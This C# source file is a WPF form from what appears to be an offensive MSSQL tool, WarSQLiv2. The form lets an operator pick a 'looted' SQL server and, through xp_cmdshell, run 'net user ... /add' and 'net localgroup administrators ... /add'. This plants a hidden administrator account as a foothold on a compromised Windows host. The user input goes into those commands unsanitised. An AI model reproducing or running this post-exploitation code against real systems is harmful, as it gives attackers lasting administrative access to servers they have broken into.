using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmAddWindowsUser.xaml
    /// </summary>
    public partial class FrmAddWindowsUser : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmAddWindowsUser()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnSave.Content = _languageControl.SelectedLanguage.GetString("ButtonSave");
                    Title = _languageControl.SelectedLanguage.GetString("TitleWindowsUserAdd");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void btnSave_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.SqlCommand = "net user " + txtUserName.Text + " " + txtPassword.Text + " /add";
                    _postExploitation.VolumeList = new List<string>();
                    _postExploitation.VolumeList.Clear();
                    _postExploitation.SqlExploitation();
                    txtStatus.AppendText(_postExploitation.ExploitResult);
                    for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                    {
                        txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", "").Replace("                       ", "").Replace("                                                                                                             ", "").Replace("  ", ""));
                    }
                });
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.SqlCommand = string.Empty;
                    _postExploitation.SqlCommand += "net localgroup administrators " + txtUserName.Text + " /add";
                    _postExploitation.VolumeList = new List<string>();
                    _postExploitation.VolumeList.Clear();
                    _postExploitation.SqlExploitation();
                    txtStatus.AppendText(_postExploitation.ExploitResult);
                    for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                    {
                        txtStatus.AppendText(_postExploitation.VolumeList[i].Replace("\r", "").Replace("\n", ""));
                    }
                });
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
    }
}
